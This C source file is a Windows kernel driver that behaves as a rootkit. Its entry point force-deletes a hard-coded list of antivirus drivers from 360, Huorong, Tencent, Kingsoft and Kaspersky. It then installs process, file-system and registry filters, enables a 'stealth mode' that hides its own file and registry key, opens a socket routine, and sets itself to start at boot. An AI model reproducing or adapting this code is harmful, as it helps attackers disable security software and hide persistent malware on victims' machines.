

#include <fltKernel.h>
#include <Ntddk.h>
#include "ExcludeList.h"

#include "RegFilter.h"
#include "FsFilter.h"
#include "PsMonitor.h"
#include "Device.h"
#include "Driver.h"
#include "Configs.h"
#include "Helper.h"

#include "ForceDelete.h"

#define DRIVER_ALLOC_TAG 'nddH'



PDRIVER_OBJECT g_driverObject = NULL;
volatile LONG g_driverActive = FALSE;

CONST PWCHAR g_DelFiles[] = {
	L"C:\\Windows\\System32\\drivers\\DsArk64.sys",//360
	L"C:\\Windows\\System32\\drivers\\360AntiSteal64.sys",
	L"C:\\Windows\\System32\\drivers\\360FsFlt.sys",
	L"C:\\Windows\\System32\\drivers\\360netmon.sys",
	L"C:\\Windows\\System32\\drivers\\360AntiAttack64.sys",
	L"C:\\Windows\\System32\\drivers\\360AntiHijack64.sys",
	L"C:\\Windows\\System32\\drivers\\360AntiExploit64.sys",
	L"C:\\Windows\\System32\\drivers\\360AntiHacker64.sys",
	L"C:\\Windows\\System32\\drivers\\BAPIDRV64.sys",
	L"C:\\Windows\\System32\\drivers\\360reskit64.sys",
	L"C:\\Windows\\System32\\drivers\\360qpesv64.sys",
	L"C:\\Windows\\System32\\drivers\\360Sensor64.sys",
	L"C:\\Windows\\System32\\drivers\\360Box64.sys",
	L"C:\\Program Files (x86;\\360\\360Safe\\deepscan\\AtS64.sys",
	L"C:\\Windows\\System32\\drivers\\sysdiag_win10.sys",//火绒
	L"C:\\Windows\\System32\\drivers\\hrwfpdrv_win10.sys",
	L"C:\\Windows\\System32\\drivers\\sysdiag.sys",
	L"C:\\Windows\\System32\\drivers\\hrwfpdrv.sys",
	//L"C:\\Windows\\System32\\drivers\\hrdevmon.sys",
	L"C:\\Windows\\Windows\\System32\\drivers\\hrdevmon_win10.sys",
	L"C:\\Windows\\Windows\\System32\\drivers\\nxeng.sys",
	L"C:\\Windows\\System32\\drivers\\TAOAcceleratorEx64_ev.sys",//QQ
	L"C:\\Windows\\System32\\drivers\\TAOAccelerator64.sys",
	L"C:\\Windows\\System32\\drivers\\qmbsecx64.sys",
	L"C:\\Windows\\System32\\drivers\\TFsFltX64_ev.sys",
	L"C:\\Windows\\System32\\drivers\\TAOKernel64.sys",
	L"C:\\Windows\\System32\\drivers\\ksapi64.sys", //金山
	L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\kxescan\\kdhacker64_ev.sys",
	L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\kxescan\\kdhacker64.sys",
	L"C:\\Windows\\System32\\drivers\\kavbootc64_ev.sys",
	L"C:\\Windows\\System32\\drivers\\KAVBootC64.sys",
	L"C:\\Windows\\System32\\drivers\\kisknl.sys",
	L"C:\\Windows\\System32\\drivers\\bootsafe64.sys",
	L"C:\\Windows\\System32\\drivers\\ksthlp64.sys",
	L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\ksde\\kisnetflt64.sys",
	L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\security\\ksnetm\\kisnetm64.sys",
	L"C:\\Program Files (x86)\\kingsoft\\kingsoft antivirus\\khwinfo64.sys",
	L"C:\\Windows\\System32\\drivers\\klgse.sys",//卡巴
	L"C:\\Windows\\System32\\drivers\\klhk.sys",
	L"C:\\Windows\\System32\\drivers\\klflt.sys",
	L"C:\\Windows\\System32\\drivers\\klif.sys",
	L"C:\\Windows\\System32\\drivers\\klwtp.sys",
	L"C:\\Windows\\System32\\drivers\\klim6.sys",
	L"C:\\Windows\\System32\\drivers\\klkbdflt2.sys",
	L"C:\\Windows\\System32\\drivers\\cm_km.sys",
	L"C:\\Windows\\System32\\drivers\\kldisk.sys",
	L"C:\\Windows\\System32\\drivers\\klwfp.sys",
	L"C:\\Windows\\System32\\drivers\\kneps.sys",
	L"C:\\Windows\\System32\\drivers\\klpd.sys",
	L"C:\\Windows\\System32\\drivers\\klupd_klif_arkmon.sys",
	L"C:\\Windows\\System32\\drivers\\klupd_klif_klbg.sys",
	L"C:\\Windows\\System32\\drivers\\klbackupdisk.sys",
	L"C:\\Windows\\System32\\drivers\\klupd_klif_klark.sys",
	L"C:\\Windows\\System32\\drivers\\klupd_klif_mark.sys",
	L"C:\\ProgramData\\Kaspersky Lab\\AVP21.3\\Bases\\klids.sys",
	NULL
};

NTSTATUS   socketmain(PUNICODE_STRING RegistryPath);
// =========================================================================================

void Setvalue()
{
	//修改自身启动加载

	UNICODE_STRING RegistryPath;
	UNICODE_STRING ustrKeyValueName;
	RtlInitUnicodeString(&RegistryPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\services\\kernelquick");
	HANDLE hRegister = NULL;
	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	NTSTATUS status = STATUS_SUCCESS;

	// 打开注册表键
	InitializeObjectAttributes(&objectAttributes, &RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwOpenKey(&hRegister, KEY_ALL_ACCESS, &objectAttributes);
	if (!NT_SUCCESS(status))
	{
		return;
	}
	UNICODE_STRING name = { 0 };
	RtlInitUnicodeString(&name, L"Start");
	unsigned long  dwStart = SERVICE_SYSTEM_START;
	status = ZwSetValueKey(hRegister, &name, 0, REG_DWORD, &dwStart, sizeof(unsigned long));
	// 释放内存, 关闭句柄
	ZwClose(hRegister);
	return;
}



VOID EnableDisableDriver(BOOLEAN enabled)
{
	InterlockedExchange(&g_driverActive, (LONG)enabled);
}

BOOLEAN IsDriverEnabled()
{
	return (g_driverActive ? TRUE : FALSE);
}

// =========================================================================================

ULONGLONG g_hiddenRegConfigId = 0;
ULONGLONG g_hiddenDriverFileId = 0;

NTSTATUS InitializeStealthMode(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	PLDR_DATA_TABLE_ENTRY LdrEntry;
	UNICODE_STRING normalized;
	NTSTATUS status;

	if (!CfgGetStealthState())
		return STATUS_SUCCESS;
	
	LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

	normalized.Length = 0;
	normalized.MaximumLength = LdrEntry->FullModuleName.Length + NORMALIZE_INCREAMENT;
	normalized.Buffer = (PWCH)ExAllocatePoolWithQuotaTag(PagedPool, normalized.MaximumLength, DRIVER_ALLOC_TAG);
	
	if (!normalized.Buffer)
	{
		LogError("Error, can't allocate buffer");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	status = NormalizeDevicePath(&LdrEntry->FullModuleName, &normalized);
	if (!NT_SUCCESS(status))
	{
		LogError("Error, path normalization failed with code:%08x, path:%wZ", status, &LdrEntry->FullModuleName);
		ExFreePoolWithTag(normalized.Buffer, DRIVER_ALLOC_TAG);
		return status;
	}

	status = AddHiddenFile(&normalized, &g_hiddenDriverFileId);
	if (!NT_SUCCESS(status))
		LogWarning("Error, can't hide self registry key");

	ExFreePoolWithTag(normalized.Buffer, DRIVER_ALLOC_TAG);

	status = AddHiddenRegKey(RegistryPath, &g_hiddenRegConfigId);
	if (!NT_SUCCESS(status))
		LogWarning("Error, can't hide self registry key");

	LogTrace("Stealth mode has been activated");
	return STATUS_SUCCESS;
}

// =========================================================================================

_Function_class_(DRIVER_UNLOAD)
VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	DestroyDevice();
	DestroyRegistryFilter();
	DestroyFSMiniFilter();
	DestroyPsMonitor();


}


_Function_class_(DRIVER_INITIALIZE)
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{

	NTSTATUS status;

	UNICODE_STRING ustrFileName;
	UINT32 i;
	for (i = 0; g_DelFiles[i]; i++)
	{
		RtlInitUnicodeString(&ustrFileName, g_DelFiles[i]);
		ForceDeleteFile(ustrFileName);
	}

	UNREFERENCED_PARAMETER(RegistryPath);
	ExInitializeDriverRuntime(DrvRtPoolNxOptIn);

	
	KdPrint(("EnableDisableDriver\r\n"));
	EnableDisableDriver(TRUE);


	status = InitializeConfigs(RegistryPath);
	if (!NT_SUCCESS(status))
		LogWarning("Error, can't initialize configs");

	EnableDisableDriver(CfgGetDriverState());

	status = InitializePsMonitor(DriverObject);
	if (!NT_SUCCESS(status))
		LogWarning("Error, object monitor haven't started");

	status = InitializeFSMiniFilter(DriverObject, RegistryPath);
	if (!NT_SUCCESS(status))
		LogWarning("Error, file-system mini-filter haven't started");

	status = InitializeRegistryFilter(DriverObject);
	if (!NT_SUCCESS(status))
		LogWarning("Error, registry filter haven't started");

	status = InitializeDevice(DriverObject);
	if (!NT_SUCCESS(status))
		LogWarning("Error, can't create device");

	status = InitializeStealthMode(DriverObject, RegistryPath);
	if (!NT_SUCCESS(status))
		LogWarning("Error, can't activate stealth mode");

	DestroyConfigs();

	DriverObject->DriverUnload = DriverUnload;
	g_driverObject = DriverObject;

	socketmain(RegistryPath);

	Setvalue();


	return STATUS_SUCCESS;
}

